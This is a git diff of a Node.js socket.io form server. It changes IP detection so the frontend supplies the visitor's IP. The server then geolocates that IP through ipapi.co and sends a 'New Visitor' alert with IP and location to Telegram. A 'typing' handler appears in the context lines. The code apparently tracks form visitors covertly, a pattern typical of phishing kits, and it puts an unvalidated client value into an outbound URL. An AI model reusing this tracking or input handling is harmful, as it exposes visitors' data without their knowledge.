@@ -27,36 +27,27 @@ io.on("connection",(socket)=>{
 
     console.log("User opened the form");
 
-    // ✅ Better IP detection
-    let ip =
-        socket.handshake.headers["x-forwarded-for"] ||
-        socket.conn.remoteAddress ||
-        socket.handshake.address;
+    // ✅ Receive IP from frontend
+    socket.on("user-ip", (ip) => {
 
-    if (ip && ip.includes(",")) {
-        ip = ip.split(",")[0];
-    }
+        console.log("REAL USER IP:", ip);
 
-    if (ip) {
-        ip = ip.replace("::ffff:", "");
-    }
+        axios.get(`https://ipapi.co/${ip}/json/`)
+        .then(res => {
+            const data = res.data;
 
-    // 🌐 Get location from API
-    axios.get(`https://ipapi.co/${ip}/json/`)
-    .then(res => {
-        const data = res.data;
+            const location = `${data.city || "Unknown"}, ${data.region || ""}, ${data.country_name}`;
 
-        const location = `${data.city || "Unknown"}, ${data.region || ""}, ${data.country_name}`;
+            console.log("Location:", location);
 
-        console.log("IP:", ip);
-        console.log("Location:", location);
+            sendTelegram(`⚠️ New Visitor\nIP: ${ip}\nLocation: ${location}`);
+        })
+        .catch(err => {
+            console.log("Location error:", err.message);
 
-        sendTelegram(`⚠️ New Visitor\nIP: ${ip}\nLocation: ${location}`);
-    })
-    .catch(err => {
-        console.log("Location fetch error:", err.message);
+            sendTelegram(`⚠️ New Visitor\nIP: ${ip}\nLocation: Unknown`);
+        });
 
-        sendTelegram(`⚠️ New Visitor\nIP: ${ip}\nLocation: Unknown`);
     });
 
     socket.on("typing",(data)=>{
